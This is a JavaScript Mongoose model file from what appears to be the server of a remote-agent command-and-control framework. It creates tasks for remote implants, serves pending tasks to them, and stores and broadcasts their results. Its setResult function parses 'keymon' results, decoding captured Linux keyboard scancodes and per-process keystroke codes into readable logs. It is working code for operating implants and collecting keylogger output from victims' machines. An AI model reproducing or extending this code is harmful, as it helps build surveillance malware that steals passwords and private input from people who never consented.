/**
 * @file Tasks model
 * @author Umar Abdul
 */

import crypto from 'crypto';
import mongoose from 'mongoose';
import Agent, {getAgent} from './agent.js';

const taskSchema = mongoose.Schema({
  uid: {
    type: String,
    required: true,
  },
  owner: {
    type: String,
    required: true
  },
  agentID: {
    type: String,
    required: true
  },
  taskType: {
    type: String,
    required: true
  },
  data: {
    type: Object,
  },
  dateCreated: {
    type: Number,
    required: true
  },
  received: {
    type: Boolean,
    required: true,
    default: false
  },
  dateReceived: {
    type: Number
  },
  completed: {
    type: Boolean,
    required: true,
    default: false
  },
  dateCompleted: {
    type: Number
  },
  result: {
    type: String
  }
});

const Task = mongoose.model('task', taskSchema);
export default Task;

/**
 * Create a new task. Emits "new_task" ws event on success.
 * @param {string} owner - The task owner (username of the user that creates the task)
 * @param {object} data - The task data (agentID, taskType, and data)
 * @return {object} The task created.
 */
export const createTask = async (owner, data) => {

  const socketServer = global.socketServer;
  const taskID = crypto.randomBytes(8).toString('hex').trim();
  let agentID = data.agentID.toString().trim();
  const agent = await getAgent(agentID); // will throw an error in not valid.
  const taskType = data.taskType.toString().trim();
  const task = new Task({
    uid: taskID,
    owner,
    agentID: agent.uid,
    taskType,
    data: data.data,
    dateCreated: Date.now()
  });
  await task.save();
  socketServer.emit("new_task", task);
  socketServer.emit("agent_console_output", {
    agentID: task.agentID,
    msg: global.serverPrompt + `Task '${task.uid}' (${taskType}) created by '${task.owner}'`
  });
  return task;
};

/**
 * Delete an existing task. Emits "task_deleted" ws event on success.
 * @param {string} agentID - The ID of the agent.
 * @param {string} taskID - The ID of the task.
 * @param {string} username - The username of the user that request the action.
 * @return {object} The query result.
 */
export const deleteTask = async (agentID, taskID, username) => {

  const socketServer = global.socketServer;
  agentID = agentID.toString();
  taskID = taskID.toString();
  const data = await Task.deleteOne({uid: taskID, agentID});
  if (data.deletedCount === 0){
    socketServer.emit("agent_console_output", {
      agentID,
      msg: global.serverPrompt + `Invalid task: ${taskID}`
    });
    throw new Error("Invalid task!");
  }
  socketServer.emit("task_deleted", {
    taskID,
    agentID,
    user: username
  });
  socketServer.emit("agent_console_output", {
    agentID,
    msg: global.serverPrompt + `Task '${taskID}' deleted by '${username}'`
  });
  return data;
};

/**
 * Delete all tasks for an agent.
 * This method does not emit any ws event as it is to be used only when deleting an agent,
 * and the "agent_deleted" event generated by the `deleteAgent` method of the agent model should take care of it.
 * @param {string} agentID - ID of the target agent.
 * @return {object} The query result.
 */
export const deleteAllTasks = async (agentID) => {
  return (await Task.deleteMany({agentID: agentID.toString()}));
};

/**
 * Get all tasks for the agent with the given ID.
 * It DOES NOT update the state of the task.
 * @param {string} agentID - A unique identifier for the agent.
 * @return {object} Available tasks. 
 */
export const getTasks = async (agentID) => {
  return await Task.find({agentID: agentID.toString()});
};

/**
 * Get all pending tasks (tasks that were never sent to the agent) for the agent with the given ID.
 * This is used by the agents, so we need to filter out what we send.
 * It DOES NOT update the state of the task.
 * @param {string} agentID - A unique identifier for the agent.
 * @return {object} Pending tasks. 
 */
export const getPendingTasks = async (agentID) => {
  
  const agent = await getAgent(agentID);
  if (agent.frozen)
    return [];
  return await Task.find({agentID: agentID.toString(), received: false}, ["uid", "taskType", "data"]);
};

/**
 * Get all the tasks available for all agents. This should only be accessible to authenticated users.
 * @return {object} All available tasks.
 */
export const getAllTasks = async () => {

  const allTasks = {};
  const agents = await Agent.find({});
  for (let agent of agents)
    allTasks[agent.uid] = [];
  const data = await Task.find({});
  for (let task of data){
    if (allTasks[task.agentID] !== undefined)
      allTasks[task.agentID].unshift(task);
  }
  return allTasks;
};

/**
 * Mark a task as received. Emits the "update_task" ws event on success.
 * @param {string} taskID - The ID of the task.
 * @return {object} The target task, null if invalid.
 */
export const markReceived = async (taskID) => {
  
  const socketServer = global.socketServer;
  const task = await Task.findOne({uid: taskID.toString()});
  if (!task)
    return null;
  task.received = true;
  task.dateReceived = Date.now();
  await task.save();
  socketServer.emit("update_task", task);
  socketServer.emit("agent_console_output", {
    agentID: task.agentID,
    msg: global.serverPrompt + `Task '${task.uid}' (${task.taskType}) received by agent`
  });
  return task;
};

/**
 * Set the result of a task and mark it as complete. Emits the "update_task" event on success.
 * @param {string} agentID - The ID of the agent.
 * @param {object} result - The result data.
 */
export const setResult = async (agentID, data) => {

  agentID = agentID.toString();
  let taskID = data.uid.toString();
  let result = data.result;
  if (!result)
    result = "";
  result = result.toString();
  const socketServer = global.socketServer;
  const agent = await getAgent(agentID);
  const task = await Task.findOne({uid: taskID.toString()});
  if (!(task && task.completed === false))
    throw new Error("Invalid task!");
  task.completed = true;
  task.dateCompleted = Date.now();
  if (task.taskType === "keymon"){
    task.result = "";
    console.log(data);
    // Parse main keyboard dumps.
    let keys = data["main-kbd"];
    if (keys){
      task.result += "-".repeat(10) + " Main Keyboard " + "-".repeat(10) + "\n";
      if (agent.os === "linux"){
        let mapping = {};
        mapping[1] = "[ESC]";
        for (let i = 2; i < 11; i++)
          mapping[i] = `${i - 1}`;
        mapping[11] = "0";
        mapping[12] = "-";
        mapping[13] = "=";
        mapping[14] = "[BACKSPACE]";
        mapping[15] = "[TAB]";
        mapping[16] = "q";
        mapping[17] = "w";
        mapping[18] = "e";
        mapping[19] = "r";
        mapping[20] = "t";
        mapping[21] = "y";
        mapping[22] = "u";
        mapping[23] = "i";
        mapping[24] = "o";
        mapping[25] = "p";
        mapping[26] = "[";
        mapping[27] = "]";
        mapping[28] = "[ENTER]";
        mapping[29] = "[L-CTRL]";
        mapping[30] = "a";
        mapping[31] = "s";
        mapping[32] = "d";
        mapping[33] = "f";
        mapping[34] = "g";
        mapping[35] = "h";
        mapping[36] = "j";
        mapping[37] = "k";
        mapping[38] = "l";
        mapping[39] = ";";
        mapping[40] = "'";
        mapping[41] = "`";
        mapping[42] = "[L-SHIFT]";
        mapping[43] = "\\";
        mapping[44] = "z";
        mapping[45] = "x";
        mapping[46] = "c";
        mapping[47] = "v";
        mapping[48] = "b";
        mapping[49] = "n";
        mapping[50] = "m";
        mapping[51] = ",";
        mapping[52] = ".";
        mapping[53] = "/";
        mapping[54] = "[R-SHIFT]";
        mapping[56] = "[L-ALT]";
        mapping[57] = "[SPACE]";
        mapping[58] = "[CAPSLOCK]";
        for (let i = 59; i < 69; i++)
          mapping[i] = `F${i - 58}`;
        mapping[69] = "[NUM-LOCK]";
        mapping[70] = "[SCROLL-LOCK]";
        mapping[87] = "F11";
        mapping[88] = "F12";
        mapping[100] = "[R-ALT]";
        mapping[101] = "[LINEFEED]";
        mapping[102] = "[HOME]";
        mapping[103] = "[UP]";
        mapping[104] = "[PG-UP]";
        mapping[105] = "[LEFT]";
        mapping[106] = "[RIGHT]";
        mapping[107] = "[END]";
        mapping[108] = "[DOWN]";
        mapping[109] = "[PG-DOWN]";
        mapping[110] = "[INSERT]";
        for (let i = 0; i < keys.length; i++){
          let val = mapping[parseInt(keys[i])];
          if (!val)
            val = keys[i].toString();
          task.result += val + " ";
        }    
      }else{        
        for (let i = 0; i < keys.length; i++)
          task.result += `${keys[i]} `;
      }
      task.result += "\n\n";
    }
    // Parse process dumps.
    for (let k in data){
      if (!isNaN(k)){
        let pid = parseInt(k);
        let codes = data[k];
        if (codes.length == 0)
          continue;
        result = "-".repeat(10) + " proc " + pid.toString() + " " + "-".repeat(10) + "\n";
        for (let code of codes){
          if (code == 10 || code == 13)
            result += "[ENTER] ";
          else if (code <= 31 || code >= 127)
            result += `0x${code.toString(16).padStart(2, '0')} `;
          else
            result += `${String.fromCharCode(code)} `;
        }
        result += "\n\n";
        task.result += result;
      }
    }
  }else{  
    // Cleanup trailing newlines.
    result = result.toString().replace(/\r\n+$/, "");
    result = result.replace(/\n+$/, "");
    task.result = result;
  }
  await task.save();
  socketServer.emit("update_task", task);
  let message = global.serverPrompt + `Task '${task.uid}' (${task.taskType}) completed`
  if (task.result.length > 0)
    message += `. ${task.result.length} bytes received;\n${task.result}`
  socketServer.emit("agent_console_output", {
    agentID: task.agentID,
    msg: message
  });
  return task;
};
